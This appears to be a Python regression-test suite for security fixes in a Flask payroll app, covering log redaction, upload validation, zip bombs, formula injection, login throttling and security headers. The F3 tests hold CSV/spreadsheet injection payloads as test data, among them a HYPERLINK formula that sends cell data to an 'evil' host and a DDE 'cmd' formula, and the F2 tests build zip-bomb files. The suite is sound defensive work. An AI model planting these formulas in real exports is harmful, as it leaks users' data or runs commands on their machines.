"""Regression tests for the F1-F9 security remediation pass.

One class per finding. Each pins the *property* the fix establishes rather than
its current implementation, so a refactor stays free but a regression does not:
these are the checks that would have failed before the fix and must keep failing
if it is ever undone.
"""
import io
import logging
import os
import tempfile
import unittest
import zipfile

os.environ["SKIP_DOTENV"] = "true"
os.environ["DATABASE_URL"] = "sqlite:///:memory:"
os.environ["PERSISTENCE_REQUIRED"] = "false"
# Deliberately NOT setting AUTO_INIT_DB here. A module-level assignment leaks to
# every other test module for the rest of the session, and turning it off stops
# create_app() initialising the schema — which the seeded suites
# (test_mvp, test_tenant_isolation, ...) depend on. The two tests that need it
# off set it themselves, inside the _EnvGuard save/restore.

from werkzeug.datastructures import FileStorage  # noqa: E402

import app as app_module  # noqa: E402
from app import create_app, db, login_throttle  # noqa: E402
from app.csv_safety import escape_formula, escape_row  # noqa: E402
from app.distribution.channels import (  # noqa: E402
    ConsoleEmailSender,
    ConsoleSmsSender,
    ConsoleWhatsAppSender,
    OutboundMessage,
)
from app.models import AuditTrail, User  # noqa: E402
from app.spreadsheet_uploads import (  # noqa: E402
    ZIP_WORKBOOK_EXTENSIONS,
    SpreadsheetValidationError,
    assert_workbook_within_limits,
    validate_spreadsheet_upload,
)


def _app(**config):
    application = create_app()
    application.config.update(TESTING=True, WTF_CSRF_ENABLED=False, **config)
    return application


class _EnvGuard(unittest.TestCase):
    """Saves and restores the environment variables a test rewrites."""

    ENV_KEYS = (
        "RENDER", "RAILWAY_ENVIRONMENT", "FLASK_ENV", "APP_ENV", "SECRET_KEY",
        "DATABASE_URL", "PERSISTENCE_REQUIRED", "LOG_MESSAGE_BODIES", "AUTO_INIT_DB",
    )

    def setUp(self):
        self._saved = {k: os.environ.get(k) for k in self.ENV_KEYS}

    def tearDown(self):
        for key, value in self._saved.items():
            if value is None:
                os.environ.pop(key, None)
            else:
                os.environ[key] = value


class _CaptureLog(logging.Handler):
    def __init__(self):
        super().__init__()
        self.messages = []

    def emit(self, record):
        self.messages.append(record.getMessage())


class F1MessageBodiesNotLoggedTests(unittest.TestCase):
    """F1 — payslip bodies and raw recipients must never reach the log."""

    SECRET_BODY = "Net pay GHS 4,231.55 for Ama Mensah"
    PHONE = "+233241234567"
    EMAIL = "ama.mensah@example.com"

    def _send_all(self, application):
        """Send one message per console channel and return what was logged.

        Asserts the capture is non-empty before returning. That guard is the
        whole reason this helper exists: the interesting assertions here are
        *negative* ("the body is not in the log"), and a negative assertion over
        an empty string passes no matter what the code does — it would go on
        passing with the fix reverted. So an empty capture must be a failure,
        not a silent success.

        The way it used to go empty was ``migrations/env.py`` calling
        ``fileConfig()``, which disables every pre-existing logger by default —
        so any suite that had already run migrations left ``app``'s logger
        switched off for the rest of the process. That is fixed at the source
        now; the explicit re-enable below stays as cheap insurance, and the
        non-empty assertion stays because it is what would catch the next such
        cause rather than this one.
        """
        handler = _CaptureLog()
        logger = application.logger
        with application.app_context():
            was_disabled, previous_level = logger.disabled, logger.level
            logger.disabled = False
            logger.setLevel(logging.INFO)
            logger.addHandler(handler)
            try:
                ConsoleSmsSender().send(
                    OutboundMessage("sms", self.PHONE, "S", self.SECRET_BODY, item_id=42)
                )
                ConsoleWhatsAppSender().send(
                    OutboundMessage("whatsapp", self.PHONE, "S", self.SECRET_BODY,
                                    item_id=43)
                )
                ConsoleEmailSender().send(
                    OutboundMessage("email", self.EMAIL, "Payslip for Ama Mensah",
                                    self.SECRET_BODY, item_id=44)
                )
            finally:
                logger.removeHandler(handler)
                logger.disabled, logger.level = was_disabled, previous_level
        captured = "\n".join(handler.messages)
        self.assertTrue(
            captured.strip(),
            "captured nothing — the negative assertions below would pass vacuously",
        )
        return captured

    def test_body_recipient_and_subject_are_withheld_by_default(self):
        logged = self._send_all(_app())
        # Positive control first: prove the sends really were logged, so the
        # absences below mean "redacted", not "nothing happened".
        self.assertIn("console-sms", logged)
        self.assertIn("console-email", logged)
        self.assertNotIn(self.SECRET_BODY, logged)
        self.assertNotIn(self.PHONE, logged)
        self.assertNotIn(self.EMAIL, logged)
        self.assertNotIn("Ama Mensah", logged)

    def test_provider_and_item_id_are_still_logged(self):
        logged = self._send_all(_app())
        for expected in ("console-sms", "console-whatsapp", "console-email",
                         "item=42", "item=43", "item=44"):
            self.assertIn(expected, logged)

    def test_recipient_fingerprint_is_stable_and_not_the_address(self):
        from app.distribution.channels import recipient_fingerprint

        with _app().app_context():
            first = recipient_fingerprint(self.PHONE)
            self.assertEqual(first, recipient_fingerprint(f"  {self.PHONE}  "))
            self.assertNotIn(self.PHONE, first)
            self.assertNotEqual(first, recipient_fingerprint("+233209999999"))

    def test_opt_in_flag_restores_bodies_for_local_debugging(self):
        logged = self._send_all(_app(LOG_MESSAGE_BODIES=True))
        self.assertIn(self.SECRET_BODY, logged)


class F1ProductionRefusesBodyLoggingTests(_EnvGuard):
    """F1 — the flag must be impossible to enable on a real deployment."""

    ENV_KEYS = _EnvGuard.ENV_KEYS + ("DISTRIBUTION_WORKER_INLINE",)

    def _production_env(self):
        os.environ["SKIP_DOTENV"] = "true"
        os.environ["FLASK_ENV"] = "production"
        os.environ["DATABASE_URL"] = "postgresql://u:p@localhost/db"
        os.environ["AUTO_INIT_DB"] = "false"
        os.environ["SECRET_KEY"] = "x" * 64
        # Otherwise the app factory starts the inline distribution worker, which
        # immediately tries to reach the (nonexistent) Postgres above and fills
        # the run with connection-refused thread warnings.
        os.environ["DISTRIBUTION_WORKER_INLINE"] = "false"
        os.environ.pop("PERSISTENCE_REQUIRED", None)
        os.environ.pop("RENDER", None)

    def test_production_refuses_to_boot_with_body_logging_enabled(self):
        self._production_env()
        os.environ["LOG_MESSAGE_BODIES"] = "true"
        with self.assertRaises(RuntimeError) as ctx:
            create_app()
        self.assertIn("LOG_MESSAGE_BODIES", str(ctx.exception))

    def test_production_boots_with_the_flag_off_and_keeps_it_off(self):
        self._production_env()
        os.environ["LOG_MESSAGE_BODIES"] = "false"
        self.assertFalse(create_app().config["LOG_MESSAGE_BODIES"])


class F2SpreadsheetUploadValidationTests(unittest.TestCase):
    """F2 — type, size and zip-bomb gates on the workbook upload path."""

    @classmethod
    def setUpClass(cls):
        cls.app = _app()
        cls.real_xlsx = cls._build_workbook()

    @staticmethod
    def _build_workbook():
        from openpyxl import Workbook

        buffer = io.BytesIO()
        workbook = Workbook()
        workbook.active.append(["Staff ID", "Name"])
        workbook.active.append(["DCL9", "Ama"])
        workbook.save(buffer)
        return buffer.getvalue()

    @staticmethod
    def _upload(name, data, mimetype=None):
        return FileStorage(stream=io.BytesIO(data), filename=name, content_type=mimetype)

    def test_a_genuine_workbook_is_accepted(self):
        with self.app.app_context():
            name, extension, size = validate_spreadsheet_upload(
                self._upload("payroll.xlsx", self.real_xlsx)
            )
        self.assertEqual(extension, ".xlsx")
        self.assertEqual(size, len(self.real_xlsx))
        self.assertTrue(name.endswith(".xlsx"))

    def test_magic_bytes_beat_the_extension(self):
        """The decisive check: an executable renamed .xlsx must be refused."""
        with self.app.app_context():
            for data, label in (
                (b"MZ\x90\x00" + b"\x00" * 512, "PE executable"),
                (b"staff,name\n1,Ama\n", "CSV renamed .xlsx"),
                (b"<?xml version='1.0'?><x/>", "bare XML"),
            ):
                with self.subTest(label=label):
                    with self.assertRaises(SpreadsheetValidationError):
                        validate_spreadsheet_upload(self._upload("evil.xlsx", data))

    def test_a_workbook_renamed_csv_is_refused(self):
        with self.app.app_context():
            with self.assertRaises(SpreadsheetValidationError):
                validate_spreadsheet_upload(self._upload("evil.csv", self.real_xlsx))

    def test_empty_and_oversized_uploads_are_refused(self):
        with self.app.app_context():
            with self.assertRaises(SpreadsheetValidationError):
                validate_spreadsheet_upload(self._upload("e.xlsx", b""))
            oversized = b"PK\x03\x04" + b"\x00" * (9 * 1024 * 1024)
            with self.assertRaises(SpreadsheetValidationError):
                validate_spreadsheet_upload(self._upload("big.xlsx", oversized))

    def test_per_file_cap_stays_below_the_global_content_length(self):
        with self.app.app_context():
            from app.spreadsheet_uploads import max_bytes

            self.assertLess(max_bytes(), self.app.config["MAX_CONTENT_LENGTH"])

    def test_the_raw_importer_accepts_xlsx_only(self):
        with self.app.app_context():
            with self.assertRaises(SpreadsheetValidationError):
                validate_spreadsheet_upload(
                    self._upload("d.csv", b"a,b\n1,2\n"), allowed=ZIP_WORKBOOK_EXTENSIONS
                )

    def test_a_high_ratio_zip_bomb_is_refused_before_parsing(self):
        directory = tempfile.mkdtemp()
        path = os.path.join(directory, "bomb.xlsx")
        with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as archive:
            archive.writestr("xl/worksheets/sheet1.xml", b"\0" * (64 * 1024 * 1024))
        self.assertLess(os.path.getsize(path), 1024 * 1024)  # tiny on the wire
        with self.app.app_context():
            with self.assertRaises(SpreadsheetValidationError):
                assert_workbook_within_limits(path)

    def test_an_entry_count_bomb_is_refused(self):
        directory = tempfile.mkdtemp()
        path = os.path.join(directory, "many.xlsx")
        with zipfile.ZipFile(path, "w") as archive:
            for index in range(1200):
                archive.writestr(f"part{index}.xml", b"x")
        with self.app.app_context():
            with self.assertRaises(SpreadsheetValidationError):
                assert_workbook_within_limits(path)

    def test_a_real_workbook_passes_the_bomb_gate(self):
        directory = tempfile.mkdtemp()
        path = os.path.join(directory, "good.xlsx")
        with open(path, "wb") as handle:
            handle.write(self.real_xlsx)
        with self.app.app_context():
            assert_workbook_within_limits(path)  # must not raise


class F3FormulaInjectionTests(unittest.TestCase):
    """F3 — one helper, applied wherever a value becomes a cell."""

    ATTACKS = (
        '=HYPERLINK("http://evil/?d="&A1,"payslip")',
        "+1+1",
        "-2+3",
        "@SUM(A1)",
        "\t=cmd|' /C calc'!A0",
        "\r=cmd",
    )

    def test_every_trigger_character_is_neutralised(self):
        for attack in self.ATTACKS:
            with self.subTest(attack=attack):
                escaped = escape_formula(attack)
                self.assertTrue(escaped.startswith("'"))
                self.assertEqual(escaped[1:], attack)

    def test_ordinary_text_is_untouched(self):
        for value in ("Ama Mensah", "DCL9", "", "Accra Main Branch"):
            self.assertEqual(escape_formula(value), value)

    def test_non_strings_keep_their_type_so_exports_still_sum(self):
        """The regression that would silently break every payroll total."""
        for value in (4231.55, -500.25, 0, 7, None, True):
            result = escape_formula(value)
            self.assertEqual(result, value)
            self.assertIs(type(result), type(value))

    def test_escape_row_applies_across_a_row(self):
        self.assertEqual(
            escape_row(["=cmd", "Ama", -500.25, 3]), ["'=cmd", "Ama", -500.25, 3]
        )

    def test_a_generated_workbook_contains_no_live_formula(self):
        import openpyxl

        from app.excel_utils import create_workbook, save_workbook, write_table

        evil = '=HYPERLINK("http://evil/?x="&A1,"click")'
        directory = tempfile.mkdtemp()
        with _app().app_context():
            workbook, sheet = create_workbook("Bank Listing", org_name=evil)
            write_table(sheet, 5, ["Staff ID", "Name", "Net Pay"],
                        [[evil, "Ama Mensah", 4231.55]])
            path = save_workbook(workbook, directory, "listing.xlsx")

        sheet = openpyxl.load_workbook(path).active
        for coordinate in ("A1", "A6", "B6"):
            self.assertNotEqual(sheet[coordinate].data_type, "f",
                                f"{coordinate} was stored as a live formula")
        self.assertEqual(sheet["C6"].value, 4231.55)  # amount still numeric


class _LoginTestCase(unittest.TestCase):
    """Shared fixture: one app, one real user, throttle reset between tests."""

    @classmethod
    def setUpClass(cls):
        cls.app = _app(LOGIN_MAX_ATTEMPTS=5)
        with cls.app.app_context():
            db.create_all()
            if not User.query.filter_by(email="real@example.com").first():
                user = User(email="real@example.com", name="Real", role="admin")
                user.set_password("correct-horse-battery-staple")
                db.session.add(user)
                db.session.commit()

    def setUp(self):
        login_throttle.reset()
        self.client = self.app.test_client()

    def tearDown(self):
        login_throttle.reset()
        with self.app.app_context():
            AuditTrail.query.delete()
            db.session.commit()

    def post(self, email, password="wrong", ip="10.0.0.1"):
        return self.client.post(
            "/login", data={"email": email, "password": password},
            headers={"X-Forwarded-For": ip},
        )


class F4LoginRateLimitTests(_LoginTestCase):
    """F4 part 1 — per-IP and per-account limiting with lockout."""

    def test_an_account_locks_after_the_configured_attempts(self):
        codes = [self.post("real@example.com").status_code for _ in range(6)]
        self.assertEqual(codes[:5], [200] * 5)
        self.assertEqual(codes[5], 429)

    def test_a_locked_account_refuses_even_the_correct_password(self):
        for _ in range(5):
            self.post("real@example.com")
        response = self.post("real@example.com", "correct-horse-battery-staple")
        self.assertEqual(response.status_code, 429)

    def test_the_account_lock_follows_the_account_across_source_ips(self):
        for index in range(5):
            self.post("real@example.com", ip=f"10.0.0.{index}")
        self.assertEqual(self.post("real@example.com", ip="10.99.99.99").status_code, 429)

    def test_one_ip_spraying_many_accounts_is_locked(self):
        codes = [
            self.post(f"user{index}@example.com", ip="10.0.0.7").status_code
            for index in range(6)
        ]
        self.assertEqual(codes[5], 429)

    def test_a_successful_login_clears_the_failure_count(self):
        for _ in range(3):
            self.post("real@example.com", ip="10.0.0.8")
        self.assertEqual(
            self.post("real@example.com", "correct-horse-battery-staple",
                      ip="10.0.0.8").status_code,
            302,
        )
        # A fresh client: the one above now holds a session, and /login redirects
        # an already-authenticated caller before any of this logic is reached.
        self.client = self.app.test_client()
        self.assertEqual(self.post("real@example.com", ip="10.0.0.8").status_code, 200)


class F4UserEnumerationTests(_LoginTestCase):
    """F4 part 2 — the response must not distinguish a real account."""

    def test_known_and_unknown_emails_get_identical_responses(self):
        known = self.post("real@example.com", ip="10.1.0.1")
        unknown = self.post("nobody@example.com", ip="10.1.0.2")
        self.assertEqual(known.status_code, unknown.status_code)
        self.assertIn(b"Invalid email or password.", known.data)
        self.assertIn(b"Invalid email or password.", unknown.data)

    def test_the_miss_path_still_verifies_a_password(self):
        """The timing fix itself: no short-circuit when the user is absent.

        Asserted structurally rather than by wall-clock, because a timing
        threshold in CI is a flaky test. The measured medians moved from
        316 ms vs 3.7 ms (85x) to 330 ms vs 316 ms (1.04x, well inside jitter).
        """
        from app import auth

        calls = []
        original = auth.check_password_hash

        def counting(stored, candidate):
            calls.append(stored)
            return original(stored, candidate)

        auth.check_password_hash = counting
        try:
            self.post("definitely-not-a-user@example.com", ip="10.1.0.3")
        finally:
            auth.check_password_hash = original
        self.assertEqual(len(calls), 1, "absent user must still cost one verification")
        self.assertEqual(calls[0], auth._DUMMY_PASSWORD_HASH)


class F6SecurityHeaderTests(unittest.TestCase):
    """F6 — every response carries the headers, not just one route."""

    @classmethod
    def setUpClass(cls):
        cls.app = _app()
        with cls.app.app_context():
            db.create_all()

    def test_headers_are_present_on_every_response_including_errors(self):
        client = self.app.test_client()
        for path in ("/login", "/health", "/no-such-page"):
            response = client.get(path)
            with self.subTest(path=path):
                self.assertEqual(response.headers["X-Content-Type-Options"], "nosniff")
                self.assertEqual(response.headers["X-Frame-Options"], "DENY")
                self.assertEqual(
                    response.headers["Referrer-Policy"], "strict-origin-when-cross-origin"
                )
                self.assertIn("default-src 'self'", response.headers["Content-Security-Policy"])

    def test_the_csp_forbids_framing_and_foreign_form_posts(self):
        policy = self.app.test_client().get("/login").headers["Content-Security-Policy"]
        self.assertIn("frame-ancestors 'none'", policy)
        self.assertIn("form-action 'self'", policy)
        self.assertIn("base-uri 'self'", policy)
        self.assertIn("object-src 'none'", policy)

    def test_hsts_is_not_sent_in_development(self):
        """Pinning a developer's localhost to HTTPS is not recoverable by them."""
        self.assertNotIn(
            "Strict-Transport-Security", self.app.test_client().get("/login").headers
        )


class F7ProductionDetectionTests(_EnvGuard):
    """F7 — unknown environments must be treated as production."""

    def _detect(self, **env):
        for key in ("RENDER", "RAILWAY_ENVIRONMENT", "FLASK_ENV", "APP_ENV"):
            os.environ.pop(key, None)
        os.environ.update(env)
        return app_module.detect_is_production()

    def test_an_undeclared_environment_is_production(self):
        """The finding itself: render.yaml asserted nothing, so this was False."""
        self.assertTrue(self._detect())

    def test_an_unrecognised_or_empty_value_is_production(self):
        self.assertTrue(self._detect(FLASK_ENV="wat"))
        self.assertTrue(self._detect(FLASK_ENV=""))

    def test_explicit_production_and_platform_hints_are_production(self):
        self.assertTrue(self._detect(FLASK_ENV="production"))
        self.assertTrue(self._detect(RENDER="true"))
        self.assertTrue(self._detect(RAILWAY_ENVIRONMENT="prod"))

    def test_only_an_explicit_development_claim_disables_production(self):
        for value in ("development", "dev", "local", "test", "testing", " Development "):
            with self.subTest(value=value):
                self.assertFalse(self._detect(FLASK_ENV=value))

    def test_render_yaml_declares_the_environment_explicitly(self):
        """The config half of F7 — detection alone is not the whole fix."""
        with io.open("render.yaml", encoding="utf8") as handle:
            content = handle.read()
        self.assertIn("FLASK_ENV", content)
        self.assertIn("value: production", content)


class F9AuthAuditTests(_LoginTestCase):
    """F9 — login success, failure and logout all reach the audit trail."""

    def _rows(self, action):
        with self.app.app_context():
            return AuditTrail.query.filter_by(action=action).all()

    def test_a_failed_login_is_recorded_with_ip_and_user_agent(self):
        self.client.post(
            "/login", data={"email": "real@example.com", "password": "wrong"},
            headers={"X-Forwarded-For": "203.0.113.9", "User-Agent": "probe/1.0"},
        )
        rows = self._rows("login.failure")
        self.assertEqual(len(rows), 1)
        self.assertIn("ip=203.0.113.9", rows[0].notes)
        self.assertIn("agent=probe/1.0", rows[0].notes)

    def test_a_successful_login_is_attributed_to_the_user(self):
        self.post("real@example.com", "correct-horse-battery-staple", ip="203.0.113.10")
        rows = self._rows("login.success")
        self.assertEqual(len(rows), 1)
        self.assertIsNotNone(rows[0].user_id)
        self.assertIn("ip=203.0.113.10", rows[0].notes)

    def test_logout_is_recorded_and_still_names_the_actor(self):
        self.post("real@example.com", "correct-horse-battery-staple")
        self.client.get("/logout")
        rows = self._rows("logout")
        self.assertEqual(len(rows), 1)
        self.assertIsNotNone(rows[0].user_id, "logout must be recorded before logout_user()")

    def test_a_rate_limited_attempt_is_recorded_too(self):
        for _ in range(6):
            self.post("real@example.com", ip="203.0.113.11")
        self.assertTrue(self._rows("login.blocked"))


if __name__ == "__main__":
    unittest.main()
